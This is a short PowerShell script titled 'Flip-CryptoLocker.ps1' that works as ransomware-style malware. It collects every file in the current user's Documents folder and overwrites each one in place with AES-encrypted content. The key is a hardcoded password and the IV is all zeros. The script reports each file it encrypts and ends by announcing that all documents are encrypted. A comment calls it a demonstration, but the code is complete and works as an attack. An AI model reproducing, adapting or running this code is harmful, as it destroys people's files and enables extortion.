# Flip-CryptoLocker.ps1

function Encrypt-File {
    param (
        [Parameter(Mandatory=$true)]
        [string]$Path,
        
        [Parameter(Mandatory=$true)]
        [string]$Password
    )
    
    $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    $AES.IV = New-Object byte[]($AES.IV.Length)
    $AES.Key = [System.Text.Encoding]::UTF8.GetBytes($Password.PadRight($AES.Key.Length, '0'))

    $Content = Get-Content -Path $Path -Encoding Byte
    $EncryptedContent = $AES.CreateEncryptor().TransformFinalBlock($Content, 0, $Content.Length)

    Set-Content -Path $Path -Value $EncryptedContent -Encoding Byte
}

# Fixed password for encryption (this is only for demonstration purposes, in a real scenario, you would want to generate or receive a password securely)
$Password = "D3m0P@ssw0rd"

# Detect the user's documents folder
$DocumentsFolder = [Environment]::GetFolderPath("MyDocuments")

# Get all the files in the documents folder
$Files = Get-ChildItem -Path $DocumentsFolder -File

# Encrypt each file
foreach ($File in $Files) {
    Encrypt-File -Path $File.FullName -Password $Password
    Write-Host "File encrypted: $($File.Name)"
}

Write-Host "All files in the documents folder have been encrypted!"
